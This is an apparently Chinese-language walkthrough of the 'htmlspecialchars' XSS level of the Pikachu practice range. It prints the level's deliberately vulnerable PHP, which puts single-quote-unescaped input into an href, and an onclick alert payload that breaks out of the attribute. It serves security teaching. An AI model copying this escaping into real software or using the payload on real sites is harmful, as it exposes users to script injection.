# xss之htmlspecialchars

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "xss_02.php"){
    $ACTIVE = array('','','','','','','','active open','','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');

}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR.'header.php';

$html='';
$html1='';
$html2='';
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入点啥吧！</p>";
    }else {
        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
        $message=htmlspecialchars($_GET['message']);
        $html1.="<p class='notice'>你的输入已经被记录:</p>";
        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
//        $html2.="<input class='input' type='text' name='inputvalue' readonly='readonly' value='{$message}' style='margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;'/>";
        $html2.="<a href='{$message}'>{$message}</a>";
    }
}


?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="xss.php">xss</a>
                </li>
                <li class="active">xss之htmlspecialchars</li>
            </ul><!-- /.breadcrumb -->

            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="先去查一下htmlspecialchars这个方法的含义">
                点一下提示~
            </a>

        </div>
        <div class="page-content">

            <div id="xssr_main">
                <p class="xssr_title">人生之所有苦短,是因为你的xss学习的还不够好</p>
                <form method="get">
                    <input class="xssr_in" type="text" name="message" />

                    <input class="xssr_submit" type="submit" name="submit" value="submit" />
                </form>
                <?php
                echo $html;
                echo $html1;
                echo $html2;
                ?>
            </div>

        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR.'footer.php';

?>
```

可以看到加入了htmlspecialchars()函数，对输入的一些字符都转换为实体标签

***

# 二、通关教程

htmlspecialchars() 是PHP里面把预定义的字符转换为HTML实体的函数，被转换的字符如下

```
# 插入下方字符时
"<'>#?

# 被转换后的代码
<a href="&quot;<" &gt;#?'="">"&lt;'&gt;#?</a>
```

![image-20230304133112924](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\XSS（跨站脚本）\images\image-20230304133112924.png)

根据上方返回的信息可以看到字符 " < >都被转换成了HTML实体函数，但字符'并未被转化(默认不对'进行处理)

插入的字符都会被包裹在a标签的href属性里，可以使用onclick属性执行弹窗命令

```
# 正常代码
<a href="1">1</a>

# Payload
' onclick=alert(/xss/) '		# 前后的'用于闭合a标签的href属性

# 插入Payload后
<a href="" onclick="alert(/xss/)" ''="">' onclick=alert(/xss/) '</a>
```

![image-20230304133428679](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\XSS（跨站脚本）\images\image-20230304133428679.png)

